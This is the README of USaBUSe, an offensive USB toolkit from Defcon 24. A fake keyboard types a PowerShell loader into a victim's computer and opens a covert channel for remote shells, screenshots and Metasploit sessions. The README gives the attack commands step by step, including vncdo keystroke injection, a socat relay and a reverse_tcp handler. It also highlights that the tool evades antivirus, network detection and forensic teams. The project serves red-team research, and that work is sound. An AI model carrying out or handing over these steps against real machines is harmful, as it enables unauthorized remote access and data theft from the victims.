Introduction
============

(There's a full write up at https://www.sensepost.com/blog/2016/universal-serial-abuse/)

Universal Serial aBUSe is a project released at Defcon 24 by Rogan Dawes. We took some fairly common attacks (fake keyboards in small USB devices that type nasty things) and extended them to provide us with a bi-directional binary channel over our own wifi network to give us remote access independent of the host's network. This gives us several improvements over traditional "Rubber Ducky" style attacks:

* We can trigger the attack when we want. No missed executions.
* We don't use the host's network. No hassle on exfil, or potential for NIDS catching us.
* We can shrink our initial typed payload to just open the binary pipe. Much less fragile typing required.
* Lots of heavy lifting can be moved to the hardware, which gives less for stuff like AV to trigger on or DFIR teams to find.
* We don't show up as a network adapter, our binary pipe is an innocuous device, making it harder to spot.

Lastly, we wanted this to be a working, end-to-end, attack. This means we also spent time adding some nifty features like:

* A mouse jiggler to prevent the screen saver from activating (but with no visible movement of the mouse)
* Optimised payloads that are hidden from a user within 4s of their activation
* An ability to integrate your favourite payload

Linux Update
============

Software for using low-cost Linux hardware, such as the BeagleBone Black, Raspberry Pi Zero (and now W, too!), Orange Pi Zero, etc was released recently. This enhances the protocol used over the "pipe" to support multiple concurrent connections, allowing things like meterpreter upgrades, beaconing C&C, etc, to work over USaBUSe. The new software includes the following:

1. Linux shell script to configure the USB gadget (and remove it again)
2. a VNC server implementation that emits keystrokes and mouse movements via a composite HID device.
3. Updated Powershell code implementing the new multiplexing protocol, both for the initial bootstrap, as well as a more fully featured implementation.
4. a HIDProxy implementation that reads and writes the raw HID device, and converts it back into multiple socket connections as necessary. It also delivers the second stage Powershell code.

Getting started with the Linux implementation is a matter of running the shell script to configure the USB gadget (currently identical to the AVR implementation of USaBUSe), running the VNC server, and the HID proxy, and setting up your listener to catch the incoming shell!

Running on Linux
================

I’ll assume that you have the SBC installed with a version of Linux. Depending on the SBC, you may have to jump through other hoops to get the OTG interface working. For examples, on the Raspberry Pi Zero, follow Gbaman’s guide. On the BeagleBone Black, everything is configured already, as far as I recall.

To make sure it is ready, check that the following command returns a result:

  ls -l /sys/class/udc/

You will likely need a few prerequisites before you continue, particularly:

  sudo apt install git libvncserver-dev build-essentials

Then

  git clone https://github.com/SensePost/USaBUSe

Run the script to configure the USB gadget:

  cd USaBUSe/linux
  sudo ./configure_USB.sh

You should see the OS recognise the new device, and load the drivers.

Compiling the VNC server should be fairly simple, just run make in the appropriate directory.

  cd ../vncserver
  make
  ./usabuse_vnc &

Or alternatively, do not background it, and continue in a new terminal window (e.g. using screen).

At this point, you need to make a decision about where you want to run the HID proxy server. As a Java application, it can be a little heavyweight to run on a small SBC. It can run OK on the Pi Zero, but there is not a huge amount of memory available. The alternative, which is the recommended approach, is to forward the HID device file over the network to a more capable computer, using socat:

  while sleep 5; do
  socat TCP:192.168.2.1:65534 /dev/hidg1
  done

Substitute the 192.168.2.1 IP address for that of your own workstation. This will continuously attempt to connect to the HID Proxy server, and only then start reading and writing from the HID device.

Install Java on the computer you plan to run the HIDProxy on:

  sudo apt install oracle-java8-jdk maven2
  mvn package
  java -jar target/hidproxy-1.0.0.one-jar.jar

By default, the application will listen on *:65534 for an incoming connection, assuming that the HIDProxy is being run on a different machine to the SBC. To run it on the SBC, run it as follows:

  java -Dsource=/dev/hidg1 -jar target/hidproxy-1.0.0.one-jar.jar

By default, HIDProxy will forward connections on channel 1 to localhost:4444, and any higher connections to localhost:65535. This is because the first connection is always the cmd shell, and any other connections will be connections to localhost:65535 on the victim.

See https://sensepost.com/blog/2017/usabuse-linux-updates/ for an example of how to use the TCP forwarding with Meterpreter.

Getting the Code
================

This repository has instructions and code for building the Universal Serial aBuse firmwares and host software. Start off by performing a recursive clone of the repository:

```
$ git clone --recursive https://github.com/sensepost/USaBUSe
```

This can take some time, please be patient!

If you'd like to just run the attacks, then you don't need to clone all the submodules. The latest release (https://github.com/sensepost/USaBUSe/releases) will have precompiled firmware. After that you'll just need:
* esptool to flash the firmware
* vncdotool to run the automated interaction on the client
* the scripts in this repository for the payloads and orchestration

Programming the firmwares
=========================

```
  $ esp-vnc/flash_esp esp-vnc/firmware/user1.bin avr/KeyboardMouseGeneric/KeyboardMouseGeneric.hex
```

Note: The flash_esp and flash_avr shell scripts contain a pattern which usually
manages to identify the serial port that the AVR appears at. If you have other
USB Serial interfaces connected, you may want to either unplug them, or update
the pattern to exclude the incorrect ports.

Interacting with the device
===========================

To send keystrokes and mouse movements to the device, use a VNC client. The
password is hard coded to "password".

To do this in an automated way, the vncdo tool is very useful. It is referenced
as a submodule, to install it:

```
  $ cd vncdotool
  $ python setup.py install
```

Note, vncdotool is only compatible with Python2.7, not python 3+

```
  $ vncdo -s esp-link.lan -p password type "echo hello" key enter
```

A more comprehensive example might be:

```
  $ vncdo -s esp-link.lan -p password key meta-r pause 1 type powershell key enter pause 1 typefile powershell/read_exec.ps1
```

If esp-link.lan does not resolve, look for port 23 and 5900 on the local network,
or check your DHCP server.

Interacting with the Generic HID interface requires the victim-side code found
under the powershell/ directory, as well as the attacker-side code found in
stage.sh. 

*A demonstration of a complete, end-to-end attack can be found in attack.sh*

In summary, the way it works is for the attacker to use VNC to type out a stage0
payload (currently using powershell), which has just enough smarts to open the
higher-bandwidth channel (currently only Generic HID is implemented), and load
and execute a more complicated stage1 payload. There are a couple of stage1
payloads implemented currently:

* spawn.ps1 - Run cmd.exe, and pipe stdout/stderr over the device, while reading
  from the device, and writing that to stdin of the process.
* screenshot.ps1 - take a screenshot of the desktop, and send it over the device.
* msf_proxy.ps1 - Open a TCP socket on localhost:65535, and relay data back and
  forth over the device. In a separate thread, invoke the metasploit stage
  loader, connecting to localhost:65535. This can be used to run a msfconsole
  windows/shell/reverse_tcp or even (with some patience!) a full
  windows/meterpreter/reverse_tcp.

Patience is required because the USB device does not have particularly high
bandwidth. Generic HID is limited to 64KB/s, and the UART between the two
microprocessors is limited to 250kbps (25KBps), but other limitations (many
likely due to naive implementation!) limit us even further! Currently, we are
achieving approximately 4KBps.

Patches to improve the speed (and any other aspect of the system) are welcome!

Once the basic stage0 payload has been typed out via VNC, the second stage is
sent via the Generic HID interface (only implementation currently).

read_exec.ps1 expects to receive the next stage in the following format:

```
<stage length high byte><stage length low byte><powershell stage>
```

The included stage.sh shell script takes care of this process for you.

Note! There is an important sleep included between sending the second stage, and
connecting the socket to the final endpoint (msf, etc). The reason for this is
that the second stage may not finish on a 63-byte boundary, and if the final
endpoint starts sending data prematurely, some of that data may end up "packed"
into the empty space in the last packet of the stage2 payload. Currently, the
stage0 loader has no mechanism to keep this data aside for later use by the
second stage, and it gets discarded. Introducing a sleep ensures that any data
from the final endpoint does not get packed in with the stage2 payload, and
avoids data corruption.

Using Metasploit Framework
==========================

The current attack.sh script expects to connect to a listener running on port 4444
on localhost. Exactly what sort of listener that should be depends on the stage1
script that was sent. If you send spawn.ps1, the listener can be a simple
"nc -l -p 4444". If you are sending msf_proxy.ps1, the listener should be an
appropriately configured msfconsole. You can choose your payload as you like,
from the group of payloads that make use of a staged/reverse_tcp connection.

For example:
```
./msfconsole
use exploit/multi/handler
set payload windows/shell/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit
```

NB: Do NOT set LHOST to 127.0.0.1, this is an internal "magic number" used by
metasploit for its own purposes. Things randomly break if you do!

Building the AVR firmware
=========================

OS X can also get the AVR compiler by installing the Arduino app, e.g. Caskroom/cask/arduino

Linux can install using apt-get:

```
  $ sudo apt-get install gcc-avr avr-libc avrdude
```

Once the avr tools are installed, and avr-gcc is in your PATH, compile the avr firmwares:

```
  $ cd avr
  $ make
```

This should build two firmwares, Program_ESP and KeyboardMouseGeneric. i.e you should have .hex files in each directory.

Building the ESP8266 firmware
=============================

Once the recursive clone has completed, build the esp-open-sdk (make sure to
build the STANDALONE version!). OS X users PLEASE NOTE that this step MUST be
done on a case-sensitive filesystem!

```
  $ cd esp-open-sdk
  $ make STANDALONE=n
```

Once the esp-open-sdk has compiled, in the top-level directory, do:

```
  $ wget --content-disposition "http://bbs.espressif.com/download/file.php?id=1046"
  $ unzip ESP8266_NONOS_SDK_V1.5.1_16_01_08.zip
```

If you are on OS X, you will probably need to install GNU sed, and make sure it
is in your PATH. An easy way of doing this is to use HomeBrew:

```
  $ brew install gnu-sed
  $ export PATH="/usr/local/opt/gnu-sed/libexec/gnubin:$PATH"
```

Alternatively, to ensure that it remains accessible after you log out, and to
avoid strange errors on future builds, add it to your bash profile.

If you run into this, be sure to run "make clean" to remove any broken artifacts,
before trying to build again.

At this stage, you should be able to change to the esp-vnc directory, and run
make to build the ESP8266 firmware.

```
  $ cd esp-vnc
  $ make
```

NOTE: It is expected to get errors regarding incorrect parameters passed to stat
on OS X. This is part of the original esp-link makefile, and has not been
corrected. It does not affect the final firmware build, it is just a check to
make sure that the firmware is not too big.

This should result in a user1.bin file in the esp-vnc/firmware directory.
